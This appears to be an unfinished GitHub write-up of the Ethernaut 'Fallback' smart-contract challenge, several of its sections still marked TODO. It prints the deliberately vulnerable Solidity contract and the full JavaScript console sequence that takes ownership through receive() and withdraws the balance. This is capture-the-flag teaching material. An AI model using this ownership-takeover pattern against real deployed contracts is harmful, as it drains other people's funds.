# Fallback challenge - Level 1 🚧 Update In Progress 🏗
<p align="left"> <img src="https://komarev.com/ghpvc/?username=Level1&label=Repository%20views&color=0e75b6&style=flat" alt="wrappedusername" /> </p>

```yml
This smart contract has a vulnerability, because:
```

- the require statement inside the fallback function receive() is making it an easy target to exploit,  

```Solidity

receive() external payable {
  require(msg.value > 0 && contributions[msg.sender] > 0);
  owner = msg.sender; 
}
```

## 🆘 The victim contract in detail

```yml
The victim contract imports OpenZeppelin's SafeMath contract here:
```
- There is nothing much going on here, I personally would use a fixed pragma, but that is a much smaller detail,
- I would like to focus on the main purpose of the contract as a whole, a white paper is something smart contract developers should make a habit of creating during the intial build phase. The white paper gives everyone that high level view of the project and the intentions of the smart contract.
- We also have to take into account any other smart contracts or interfaces that this smart contract in question uses within it's sphere of influence.
- As for this smart contract, and probably most others too, there is no white paper so we must make an educated guess about the intentions of the contract from the information that we can find, 
- of coarse this smart contract is intended to be used as an example in a tutorial/challenge, so this explains why there are such obvious and critical vulnerabilities in the smart contract. 

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallback {

  using SafeMath for uint256;
```

- I am not sure why OpenZeppelin's Ownable contract is not used here,
- I recommend using these libraries instead of implementing your own version,
  - here is why: 
    - re-writing something that is already available is a waste of time that could introduce bugs,
    
```yml
I recommend using and modifying available libraries like OpenZepellin's Ownable, 
SafeMath, etc. to conform to the project's specific needs.
```

```Solidity
  mapping(address => uint) public contributions;
  address payable public owner;

  constructor() public {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }
```

- TODO

```Solidity
 function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}

```


## ⚠️ The vulnerability in detail

```yml
The vulnerability:
```
- TODO

```Solidity
receive() external payable {
  require(msg.value > 0 && contributions[msg.sender] > 0);
  owner = msg.sender; 
}
```

- TODO

```JavaScript
/** 
* @notice This fallback function receive() is the main attack target, in order to pass the 
* require statement player must use function contribute() 1 wei will be enough, using the console
* player calls await contract.contribute({value: 1}), then player calls await contract.sendTransaction({value: 1}),
* player can verify ownership with await contract.owner(), player will now be able to withdraw all tokens. 
*/

await contract.contribute({value: 1});
await contract.sendTransaction({value: 1 });
await contract.owner();
await contract.withdraw();

```

## 💥 The attack in detail

```yml
The attack:
```

- the [top level](https://developer.chrome.com/blog/new-in-devtools-62/#await) JavaScript awaits the player will use in the attack 💥,

```JavaScript
await contract.contribute({value: 1});
await contract.sendTransaction({value: 1 });
await contract.owner();
await contract.withdraw();
```
- the contribution to satisfy this require statement,

```Solidity
&& contributions[msg.sender] > 0

```

```JavaScript
await contract.contribute({value: 1});
```

- the value sent in the transaction to satisfy this require statement,

```Solidity
msg.value > 0 
```

```JavaScript
await contract.sendTransaction({value: 1 });
```

- checking to see if it worked,

```JavaScript
await contract.owner();
```

- 💸 withdrawing everything!

```Solidity

  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }
```

```JavaScript
await contract.withdraw();
```


## 🩺 How can we fix this vulnerablity in the victim contract?

- I would create more robust require statements, inside a seperate named function for receiving tokens how I prefer,

```Solidity

```











  
